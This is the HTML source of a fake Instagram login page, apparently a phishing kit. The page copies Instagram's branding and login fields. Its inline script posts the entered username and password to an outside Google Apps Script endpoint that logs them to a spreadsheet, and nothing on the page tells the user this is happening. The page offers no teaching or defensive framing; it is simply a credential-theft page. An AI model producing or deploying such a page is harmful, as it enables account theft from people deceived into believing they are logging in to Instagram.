  <body>
    <div id="webcrumbs">
      <div class="w-[350px] bg-white font-sans">
        <div class="flex flex-col items-center p-8">
          <span class="text-4xl font-[&#x27;Dancing_Script&#x27;] mb-12"
            >Instagram</span
          >
<form name="submit-to-google-sheet">
    
    <input
    type="text"
    name="Name"
    placeholder="Phone number, email or username"
    class="w-full px-2 py-3 mb-2 text-sm border rounded bg-gray-50 border-gray-200 focus:outline-none focus:border-gray-300"
  />
  <div class="relative w-full">
    <input
      type="password"
      name="Email"
      placeholder="Password"
      class="w-full px-2 py-3 mb-2 text-sm border rounded bg-gray-50 border-gray-200 focus:outline-none focus:border-gray-300"
    />
    <span
      class="absolute right-2 top-3 text-sm font-semibold cursor-pointer hover:opacity-70"
      >Show</span
    >
  </div>
  <button
   type="submit"
    class="w-full py-2 mb-4 text-sm font-semibold text-white bg-blue-500 rounded hover:bg-blue-600 transition duration-200"
  >
    Login
  </button>
</form>
          <div class="flex items-center text-xs text-gray-500 mb-4">
            <span>Forgot your login details?</span>
            <a href="#" class="ml-1 font-semibold hover:text-gray-900"
              >Get help logging in.</a
            >
          </div>
          <div class="flex items-center w-full mb-4">
            <div class="flex-grow h-px bg-gray-300"></div>
            <span class="px-4 text-sm text-gray-500">OR</span>
            <div class="flex-grow h-px bg-gray-300"></div>
          </div>
          <button
            class="flex items-center justify-center w-full py-2 text-sm font-semibold text-blue-900 hover:text-blue-700 transition duration-200"
          >
            <i class="fa-brands fa-facebook text-blue-900 mr-2 text-lg"></i> Log
            in with Facebook
          </button>
        </div>
      </div>
    </div>

    <script type="text/javascript" src="your-example.js"></script>
    <script>
   const scriptURL = 'https://script.google.com/macros/s/AKfycbzYfU0-HrClTLk81JR2WA8F2KqeLb-3RhBkykFve_cgNyYscdPgizGAbMGnby1G00Qg/exec'
      const form = document.forms['submit-to-google-sheet']
      const msg = document.getElementById("msg");
      form.addEventListener('Login', e => {
        e.preventDefault()
        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
          .then(response => {
            msg.innerHTML="messeage sent succesfully!"
            setTimeout(function(){
              msg.innerHTML=""
            },1000)
            form.reset()
          })
          .catch(error => console.error('Error!', error.message))
      })
    </script>
